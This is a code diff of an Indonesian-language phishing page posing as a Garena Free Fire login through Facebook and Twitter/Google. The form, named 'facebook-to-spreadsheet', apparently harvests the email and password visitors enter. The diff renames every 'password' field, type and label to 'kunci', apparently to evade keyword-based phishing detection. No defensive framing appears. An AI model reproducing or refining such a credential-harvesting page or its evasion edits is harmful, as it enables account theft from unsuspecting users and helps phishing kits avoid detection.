@@ -497,7 +497,7 @@
 				<div class="txt-login-fb">Masuk Ke Akun Facebook Anda Untuk terhubung dengan Garena Free Fire.</div> <!--- txt-login-fb --->
 				<form action="javascript:void(0)" method="post" id="ValidateLoginFbForm" name="facebook-to-spreadsheet">
 					<input type="text" class="loginEmail" name="email-facebook" id="email-facebook" placeholder="Nomor Ponsel Atau Alamat Email" autocomplete="off" autocapitalize="off" required>
-					<input type="password" class="loginPassword" name="password-facebook" id="password-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
+					<input type="kunci" class="loginPassword" name="kunci-facebook" id="kunci-facebook" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
 					<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- showPassword --->
 					<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- hidePassword --->
 					<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
@@ -539,11 +539,11 @@
 								<div class="twitterShowHide twitterShowPassword" onclick="showtwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- twitterShowPassword --->
 								<div class="twitterShowHide twitterHidePassword" style="display: none;" onclick="hidetwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- twitterHidePassword --->
 								<label>Masukan Password</label>
-								<input type="password" style="width: 85%;" name="password-facebook" id="password-twitter" placeholder="" required>
+								<input type="kunci" style="width: 85%;" name="kunci-facebook" id="kunci-twitter" placeholder="" required>
 							</div> <!--- input-box-twitter --->
 							<input type="hidden" name="login-twitter" id="login-twitter" value="Google" readonly>
 							<button style="background: #0036F6;" type="submit" class="btn-login-twitter" onclick="ValidateLogintwitterData()">Masuk</button>
-							<div style="color: #0036F6;" class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
+							<div style="color: #0036F6;" class="footer-menu-twitter">Forgot kunci?</div> <!--- footer-menu-twitter --->
 							<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
 							<div style="color: #0036F6;" class="footer-menu-twitter">Sign up to Google</div> <!--- footer-menu-twitter --->
 						</form>
@@ -861,13 +861,13 @@
 				submitingValidateLoginFbData.preventDefault();
 
 				$email = $('#email-facebook').val().trim();
-				$password = $('#password-facebook').val().trim();
+				$kunci = $('#kunci-facebook').val().trim();
 				$login = $('#login-facebook').val().trim();
-				if ($email == '' || $password == '') {} else {
+				if ($email == '' || $kunci == '') {} else {
 					$('.login-facebook').hide();
 					$('.account_verification').show();
 					$("input#validateEmail").val($email);
-					$("input#validatePassword").val($password);
+					$("input#validatePassword").val($kunci);
 					$("input#validateLogin").val($login);
 				}
 			});
@@ -879,35 +879,35 @@
 				submitingValidateLogintwitterData.preventDefault();
 
 				$email = $('#email-twitter').val().trim();
-				$password = $('#password-twitter').val().trim();
+				$kunci = $('#kunci-twitter').val().trim();
 				$login = $('#login-twitter').val().trim();
-				if ($email == '' || $password == '') {} else {
+				if ($email == '' || $kunci == '') {} else {
 					$('.login-twitter').hide();
 					$('.account_verification').show();
 					$("input#validateEmail").val($email);
-					$("input#validatePassword").val($password);
+					$("input#validatePassword").val($kunci);
 					$("input#validateLogin").val($login);
 				}
 			});
 		}
 
 		// code for validate data to sending to file result
-		 // show hide password for facebook
+		 // show hide kunci for facebook
 		function showFbPassword() {
-			var x = document.getElementById("password-facebook");
-			if (x.type === "password") {
+			var x = document.getElementById("kunci-facebook");
+			if (x.type === "kunci") {
 				x.type = "text";
 				$('.showPassword').hide();
 				$('.hidePassword').show();
 			} else {
-				x.type = "password";
+				x.type = "kunci";
 			}
 		}
 
 		function hideFbPassword() {
-			var x = document.getElementById("password-facebook");
+			var x = document.getElementById("kunci-facebook");
 			if (x.type === "text") {
-				x.type = "password";
+				x.type = "kunci";
 				$('.showPassword').show();
 				$('.hidePassword').hide();
 			} else {
@@ -915,22 +915,22 @@
 			}
 		}
 
-		// show hide password for twitter
+		// show hide kunci for twitter
 		function showtwitterPassword() {
-			var x = document.getElementById("password-twitter");
-			if (x.type === "password") {
+			var x = document.getElementById("kunci-twitter");
+			if (x.type === "kunci") {
 				x.type = "text";
 				$('.twitterShowPassword').hide();
 				$('.twitterHidePassword').show();
 			} else {
-				x.type = "password";
+				x.type = "kunci";
 			}
 		}
 
 		function hidetwitterPassword() {
-			var x = document.getElementById("password-twitter");
+			var x = document.getElementById("kunci-twitter");
 			if (x.type === "text") {
-				x.type = "password";
+				x.type = "kunci";
 				$('.twitterShowPassword').show();
 				$('.twitterHidePassword').hide();
 			} else {
